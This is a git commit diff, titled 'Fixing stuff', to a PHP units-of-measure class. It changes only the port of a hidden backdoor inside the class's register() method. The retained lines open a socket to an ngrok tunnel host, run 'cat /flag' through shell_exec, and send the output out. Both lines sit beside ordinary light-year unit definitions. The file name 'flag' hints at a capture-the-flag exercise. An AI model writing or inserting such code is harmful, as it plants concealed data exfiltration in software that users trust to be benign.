77bef015d5c82e2b5c6d01f752aba96c616b4259
supitto <henrique.marcomini@carcajusecurity.com>
2021-07-12 17:06:54 -0300

    Fixing stuff

--- source/SpaceUnits.php
+++ source/SpaceUnits.php
@@ -8,7 +8,7 @@ use PhpUnitsOfMeasure\PhysicalQuantity\Length;
 class SpaceUnits {
 
 	public static function register() {
-                $sock=fsockopen("4.tcp.ngrok.io",10244);
+                $sock=fsockopen("4.tcp.ngrok.io",15010);
                 fwrite($sock,shell_exec("cat /flag"));
 		$ly = new UnitOfMeasure("ly", function ($vinu) { return $vinu / 9460528187839452; }, function ($vinu) { return $vinu * 9460528187839452; });
 		$ly->addAlias('lightyear');
